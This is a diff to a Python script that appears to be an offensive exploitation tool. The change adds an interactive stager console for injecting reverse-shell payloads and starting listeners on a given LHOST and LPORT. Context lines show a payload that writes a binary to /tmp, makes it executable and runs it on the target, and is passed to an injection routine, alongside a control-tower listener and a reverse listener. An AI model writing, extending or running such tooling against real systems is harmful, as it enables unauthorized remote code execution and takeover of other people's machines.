@@ -10,6 +10,7 @@ import random
 import string
 import time
 import threading
+import readline
 
 parser = argparse.ArgumentParser(description='Test')
 
@@ -132,21 +133,59 @@ try:
         n = randword(4)
         pl = f'printf "{pl_bin}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'
 
+        def shell_cli():  # TODO (is this even needed?) (probably going to dumpster)
+            stager_commands = {
+                'inject': 'Injects a specified payload. Args: PAYLOAD_NAME',
+            }
+
+            stager_payloads = {
+                'lshell': f'Inject a reverse shell and start a listener. Args: SHELL_TYPE {PAYLOAD_TYPES}, LHOST, LPORT',
+                'shell': f'Inject a reverse shell. Args: SHELL_TYPE {PAYLOAD_TYPES}',
+                'custom': f'Inject a reverse shell. Args: SHELL_TYPE {PAYLOAD_TYPES}',
+            }
+
+            print('Stager injected, what to do? (>help)')
+            while True:
+                try:
+                    cmd = input('>')
+
+                    if cmd != 'help' and cmd not in stager_payloads:
+                        print('Unknown command, type help')
+
+                    if cmd == 'help':
+                        print('Shell syntax: STAGER_CMD CMD_ARGS OPT_ARGS')
+                        print('Example: inject   lshell      binshell      127.0.0.1  1337')
+                        print('           ^        ^            ^             ^        ^')
+                        print('     STAGER_CMD PYALOAD_TYPE   SHELL_TYPE    LHOST    LPORT')
+                        print('')
+                        print('--> Stager commands:')
+                        print('')
+                        for key,val in stager_commands.items():
+                            print(key + ':', val)
+                        print('')
+                        print('--> Payloads stager can inject:')
+                        print('')
+                        for key,val in stager_payloads.items():
+                            print(key + ':', val)
+                        print('')
+
+                except EOFError:  # ctrl-d
+                    ct.stop()
+                    quit()
+
+                time.sleep(0.05)
+
         def on_connect(ct):
             global inject_success
             inject_success = True
-            print('Stager injected, what to do?')
-            test = input('>')
-            print('TEST', test)
+
+            shell_cli()
 
         ct = ControlTower(ip=LHOST, port=int(STAGER_CONTROL_PORT), success_cb=on_connect)
 
         ct.start()
 
         try_inject(pl)
-
-        t = threading.Thread(target=lambda x: [time.sleep(x) for _ in range(1, 100000)], args=(1000,))
-        t.start()
 
     elif args.ptype == 'custom':
         listener = ReverseListener(
